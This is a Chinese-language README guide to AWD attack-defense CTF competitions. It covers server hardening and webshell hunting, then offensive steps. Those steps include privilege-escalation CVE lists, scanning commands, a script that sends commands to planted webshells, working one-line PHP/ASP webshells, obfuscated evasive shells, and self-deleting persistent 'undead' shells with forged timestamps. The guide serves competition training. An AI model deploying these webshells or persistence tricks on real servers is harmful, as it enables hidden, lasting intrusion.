# AWD比赛指导手册

如果你要参加AWD相关比赛，相信本项目能给你带来帮助~

![AWD-Guide](https://socialify.git.ci/AabyssZG/AWD-Guide/image?description=1&font=Bitter&forks=1&language=1&logo=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F54609266%3Fv%3D4&owner=1&pattern=Solid&stargazers=1&theme=Dark)

**如果你觉得本项目不错，欢迎给我点个Star，万分感谢~~**

## 1# 比赛环境

Windows+Linux组合模式：

- Windows Server 2003 + Centos6.x/Ubuntu14/16.04/Ubuntu17.01
- Window7 + Centos6.x/Ubuntu14/16.04/Ubuntu17.01
- Windows Server 2008 + Centos6.x/Ubuntu14/16.04/Ubuntu17.01


## 2# 防守准备（Defense）

### 2.1# Windows加固

先备份：Web源码、数据库

1. 445加固，开启防火墙或IP高级安全策略
2. 开启系统日志审计功能
3. 禁用guest账户、关闭文件共享
4. 确保启动项内容是可控的
5. 限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置--->管理模板--->Windows组件--->远程桌面服务--->远程桌面会话主机--->连接--->限制连接的数量
6. 使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe
7. 恶意代码文件，通过PCHunter、Monitor查找
8. Web目录环境查找相关可疑文件：jpg/png/rar，查看属性、解压看文件内容
9. NTFS扫描磁盘查找隐藏的交换流数据
10. 查找系统所有账户信息，禁止非Administrator账户
11. 修改Web站点管理员访问路径、默认口令、数据库口令
12. 安装WAF脚本，防护Web站点，禁止其他漏洞

### 2.2# Linux加固

先备份：Web源码、数据库

1. 系统口令修改，团队统一口令
2. 通过 `.bash_history` 查找历史命令操作，发现痕迹
3. 查看计划任务：`crontab -l`；编辑计划任务：`crontab -e`
4. 查看 `/etc/init.d/rc.local` 中启动服务有无异常
5. 使用脚本开启进程监控、目录监控、流量监控
6. Web站点口令,站点管理员路径修改
7. 系统加固：iptable

### 2.3# Mysql加固

为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456

1. 不使用默认口令，修改成复杂的，并确保和web环境连接
2. 设置只允许本地127.0.0.1账户登录：修改 `bind-address=127.0.0.1` ；在配置文件中加入 `seccure_file_priv=NULL`
3. 开启日志审计功能：`general_log_file=`路径

因为最常用的是Mysql数据库，所以基本的攻防大部分都是用mysql数据库的命令

备份指定数据库：

```mysql
mysqldump –u username –p password databasename > target.sql
```

备份所有数据库：

```mysql
mysqldump –all -databases > all.sql
```

导入数据库：

```mysql
mysql –u username –p password database < from.sql
```

### 2.4# Mssql加固

1. 删除不必要的账号	
2. SQLServer用户口令安全	
3. 根据用户分配帐号避免帐号共享
4. 分配数据库用户所需的最小权限
5. 网络访问限制
6. SQLServer登录审计
7. SQLServer安全事件审计
8. 配置日志功能

### 2.5# 防守常用命令

#### 2.5.0# 设置只读权限

Web根目录设置只读权限

```C
chmod 0555 /var/www/html
```

改变文件的属主和属组来设置严格的权限

```C
chown -R root:root /var/www/html/        //设置拥有人为：root:root 或 httpd:httpd (推荐)
chown -R apache:apache /var/www/html/    //确保 apache 拥有 /var/www/html/
```

#### 2.5.1# 明确机器信息

知己知彼，百战不殆

```C
uname -a                       //系统信息
ps -aux -ps -ef                //进程信息
id                             //用于显示用户ID，以及所属群组ID
netstat -ano/-a                //查看端口情况
cat /etc/passwd                //用户情况
ls /home/                      //用户情况
find / -type d -perm -002      //可写目录检查
grep -r “flag” /var/www/html/  //查找本地flag
```

#### 2.5.2# 查看开放端口

```c
netstat -anp                                                  //查看端口
firewall-cmd --zone= public --remove-port=80/tcp –permanent   //关闭端口
firewall-cmd –reload                                          //防火墙重启
```

#### 2.5.3# 备份源码

防止在对源码进行修改时出问题，或者被攻击方删除源码而准备

压缩

```C
tar -cvf web.tar /var/www/html
zip -q -r web.zip /var/www/html
```

解压缩

```C
tar -xvf web.tar -c /var/www/html
unzip web.zip -d /var/www/html
```

备份

```C
mv web.tar /tmp
mv web.zip /home/xxx
```

上传下载

```C
scp username@servername:/path/filename /tmp/local_destination //从服务器下载单个文件到本地
scp /path/local_filename username@servername:/path            //从本地上传单个文件到服务器
scp -r username@servername:remote_dir/ /tmp/local_dir         //从服务器下载整个目录到本地
scp -r /tmp/local_dir username@servername:remote_dir          //从本地上传整个目录到服务器
```

#### 2.5.4# 备份数据库

因为最常用的是Mysql数据库，所以基本的攻防大部分都是用mysql数据库的命令

备份指定数据库：

```mysql
mysqldump –u username –p password databasename > target.sql
```

备份所有数据库：

```mysql
mysqldump –all -databases > all.sql
```

导入数据库：

```mysql
mysql –u username –p password database < from.sql
```

#### 2.5.5# 口令更改

为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456

还有其他默认密码admin，top100， top1000等

**尤其是WEB应用的后台密码修改**

```c
passwd username                                                  //ssh口令修改
set password for mycms@localhost = password('18ciweufhi28746');  //MySQL密码修改
find /var/www//html -path '*config*’                             //查找配置文件中的密码凭证
```

#### 2.5.6# 查询进程线程

```
netstat / ps -aux
netstat -apt
```

#### 2.5.7# SSH

```
w/fuser 
```

#### 2.5.8# 杀掉进程

```
kill -9 pid
```

#### 2.5.9# 搜索关键词文件

```C
find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件
find ./ -name '*.php' | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马
grep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html    //查包含关键字的php文件
find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串"eval("的行
//使用more命令来分页显示结果，以便在输出较长时进行逐页查看
```

#### 2.5.10# 查杀不死马

也可以利用命令自动进行查找删除

```c
ps aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9
```

然后重启服务

```c
service php-fpm restart
```

#### 2.5.11# 杀弹shelll

老规矩查看进程

```c
ps -ef / px -aux
```

注意 `www-data` 权限的 `/bin/sh`，很有可能是nc

再就是上老一套命令

```c
kill ps -aux | grep www-data | grep apache2 | awk '{print $2}'
```

#### 2.5.12# 设置WAF

利用 `.htaccess` 配置文件禁止php文件执行

```php
<Directory "/var/www/html/upload">   //指定目录后续的指令将应用于该目录
Options -ExecCGI -Indexes            //禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。
AllowOverride None                   //不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。
RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  
RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      
//这两个指令移除指定文件扩展名的处理器和类型。
//在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。
php_flag engine off     //这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
deny from all
</FilesMatch>  //这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有
</Directory>
```



## 3# 攻击准备（Attack）

### 3.1# 主要准备内容

1. 各类CMS软件包最新版准备
2. 扫描工具：Nmap、Nessus、Metasploit更新
2. 漏洞利用脚本Poc、Exp


### 3.2# Linux提权

查询系统版本信息命令：

```c
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```

查询内核版本信息命令：

```c
uname -a
uname -mrs
cat /proc/version
cat /etc/issue
lsb_release -a
hostnamectl  
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```

查看系统环境变量命令：

```c
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

查看语言环境信息命令：

```c
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
set
```

查看文件上传环境信息命令：

```c
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

这里列举一些可用利用的提权漏洞：

- CVE-2023-0386（Linux OverlayFS权限提升漏洞）
- CVE-2021-4034（Linux Polkit本地权限提升漏洞）
- CVE-2017-6074 （DCCP双重释放漏洞 > 2.6.18 ）
- CVE-2016-5195（脏牛，kernel 2.6.22 < 3.9 (x86/x64)）
- CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）
- CVE-2017-1000367（sudo本地提权漏洞 ）
- CVE-2016-1247（Nginx权限提升漏洞）
- CVE-2017-16995（Ubuntu16.04   kernel:4.14-4.4）

Kali命令查询：

```
searchsploit CentOS 7
searchsploit Ubuntu 16.04
```

提权Exploit寻找：

- [http://www.exploit-db.com](http://www.exploit-db.com)
- [http://metasploit.com/modules/](http://metasploit.com/modules/)
- [http://securityreason.com](http://securityreason.com)
- [http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)
- [https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main)

编译提权Exp

```
gcc -o /usr/share/nginx/html/***** /usr/share/nginx/html/*****.c -Wall
```

直接提权，确认权限：

```
cat /etc/shadow
```

其他提权姿势：[https://www.freebuf.com/articles/system/244627.html](https://www.freebuf.com/articles/system/244627.html)

### 3.3# Windows提权和漏洞

这里列举一些Windows的漏洞：

- 各种Potato（Github上面基本都有）
- CVE-2023-35359（Windows内核权限提升漏洞，开源了）
- CVE-2022-24521（没有Exp的可以找我要）
- CVE-2019-1405
- CVE-2019-1322
- MS17-017（整型溢出漏洞）
- MS17-010（永恒之蓝，可看[https://blog.zgsec.cn/archives/172.html](https://blog.zgsec.cn/archives/172.html)）

### 3.4# 中间件漏洞

- IIS（解析漏洞、远程代码执行）
- Apache（解析漏洞）
- Nginx（解析漏洞）
- Jboss（CVE-2017-7504/CVE-2017-12149/CVE-2015-7501）
- Mysql（弱口令）
- Tomcat（弱口令Getshell）
- Weblogic（CVE-2020-2551/CVE-2020-2555/CVE-2020-2883）
- SpringBoot（未授权访问漏洞和RCE漏洞，具体可看[https://blog.zgsec.cn/archives/129.html](https://blog.zgsec.cn/archives/129.html)）

### 3.5# 集成服务环境漏洞

- wampserver
- xamppserver

### 3.6# CMS列表参考

下载最新版本+每个CMS对应的漏洞poc、exp工具脚本文章，之后汇总

- Aspcms
- Dedecms
- Dicuz
- Drupal
- Empirecms
- Eshop
- Finecms
- Joomla
- Lamp
- Metainfo
- Phpcms
- Phpwind
- Qibocms
- Seacms
- Semcms
- ThinkPHP
- Wolfcms
- Wordpress
- Zabbix

### 3.7# 攻击常用命令

#### 3.7.1# 主机信息搜集

Nmap

```c
namp -sn 192.168.0.0/24            //C段存活扫描
```

httpscan

```c
httpscan.py 192.168.0.0/24 –t 10   //C段存活扫描
```

#### 3.7.2# 端口扫描

```c
nmap -sV 192.168.0.2               //扫描主机系统版本
nmap -sS 192.168.0.2               //扫描主机常用端口
nmap -sS -p 80,445 192.168.0.2     //扫描主机部分端口
nmap -sS -p- 192.168.0.2           //扫描主机全部端口
```

Python脚本

```python
import requests

for x in range(2,255): 
    url = "http://192.168.1.{}".format(x) 
    try: 
        r = requests.post(url) 
        print(url) 
        except: 
        pass
```

#### 3.7.3# 关键文件检索

组件检索

```c
find / -name "apaech2.conf"                 //检索Apache主配置文件
find / -name "nginx.conf"                   //检索Nginx目录
find / -path "*nginx*" -name nginx*conf     //检索Nginx配置目录
find / -name "httpd.conf"                   //检索Apache目录
find / -path "*apache*" -name apache*conf   //检索Apache配置目录
```

网站首页

```c
find / -name "index.php"                    //定位网站目录
find / -name "index.html"                   //定位网站目录
```

日志文件检索

```c
/var/log/nginx/                           //默认Nginx日志目录
/var/log/apache/                          //默认Apache日志目录
/var/log/apache2/                         //默认Apache日志目录
/usr/local/tomcat/logs                    //Tomcat日志目录
tail -f xxx.log                           //实时刷新滚动日志文件
```

备份检索：https://github.com/sry309/ihoneyBakFileScan

#### 3.7.4# 上传后门

curl(跟hackbar差不多)

```c
C:\Users\admin>curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
//向shell.php文件里传入参数并返回结果
```

Python多端口传参

```python
#coding=utf-8
import requests

url_head="http://192.168.182.130"   #网段
url=""
shell_addr="/upload/url/shell.php" #木马路径
passwd="pass"                   #木马密码
#port="80"
payload = {passwd: 'System(\'cat /flag\');'}
# find / -name "flag*"

#清空上次记录
flag=open("flag.txt","w")
flag.close()
flag=open("flag.txt","a")

for i in range(8000,8004):
    url=url_head+":"+str(i)+shell_addr
    try:
        res=requests.post(url,payload)#,timeout=1
        if res.status_code == requests.codes.ok:
            result = res.text
            print (result)
            flag.write(result+"\n") 
        else:
            print ("shell 404")
    except:
        print (url+" connect shell fail")

flag.close()
```

#### 3.7.5# 一句话木马

常见一句话木马

```php
PHP： <?php @eval($_POST['pass']);?>      <?php eval($_GET['pass']);
Asp：   <%eval request ("pass")%>
Aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

get型木马

```php
<?php eval($_GET['pass']);

#利用方式/shell.php?pass=eval($_POST[1]);
```

免杀马制作：[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)

```php
<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);                            //执行GET传参 ?_=system&__=whoami 来执行whoami命令
<?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell
```

#### 3.7.6# 不死马

简单不死马

```php
<?php
set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开,脚本将继续运行。
unlink(__FILE__);     //删除自身

while(1)
{
    file_put_contents('shell.php','<?php @eval($_POST["password"]);?>');  //创建shell.php
    sleep(0);    //间隔时间
}
```

**可以通过不断复写shell.php来达到该木马难以被使用的效果**

```php
<?php
set_time_limit(0);   // 取消脚本运行时间的超时上限
ignore_user_abort(1);  // 后台运行

while(1)
{
    file_put_contents('shell.php','11111111');  //创建shell.php
    sleep(0);
}
```

进阶不死马

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'shell.php';
$code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['cmd']);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" shell2.php');  //修改时间，防止被删
    usleep(5000);
}
?>

//passwd=y0range857
//POST传参：passwd=y0range857&a=system('ls');
```

将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件

写入shell， yj.php内容

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.login.php';
$file1 = '/admin/.register.php'; 
$code = '<?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .login.php');
    file_put_contents($file1,$code);
    system('touch -m -d "2018-12-01 09:10:12" /admin/.register.php');
    usleep(5000);
}
?>
```

浏览器访问yj.php，会生成不死马.login.php /admin/.register.php

#### 3.7.7# 权限维持

1、不死马

```php
<?php 
ignore_user_abort(true);  #客户机断开依旧执行
set_time_limit(0); #函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
unlink(__FILE__);  #删除文件本身，以起到隐蔽自身的作用。
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .2.php');
    usleep(5000);
} 
?>
```

2、隐藏的文件读取

```php
<?php
header(php'flag:'.file_get_contents('/tmp/flag'));
```

条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现



## 4# 参考链接

- [http://freebuf.com/](http://freebuf.com/)
- [https://github.com/Huseck](https://github.com/Huseck)
- [https://blog.zgsec.cn/](https://blog.zgsec.cn/)
- [https://paper.seebug.org/3044/](https://paper.seebug.org/3044/)
- [https://www.anquanke.com/](https://www.anquanke.com/)
- [https://www.exploit-db.com/](https://www.exploit-db.com/)
- [http://www.bugscan.net/source/template/vulns/](http://www.bugscan.net/source/template/vulns/)
- [https://xz.aliyun.com/t/12687](https://xz.aliyun.com/t/12687)


## 🙏 5# 感谢各位师傅

## Stargazers

[![Stargazers repo roster for @AabyssZG/AWD-Guide](https://reporoster.com/stars/AabyssZG/AWD-Guide)](https://github.com/AabyssZG/AWD-Guide/stargazers)


## Forkers

[![Forkers repo roster for @AabyssZG/AWD-Guide](https://reporoster.com/forks/AabyssZG/AWD-Guide)](https://github.com/AabyssZG/AWD-Guide/network/members)
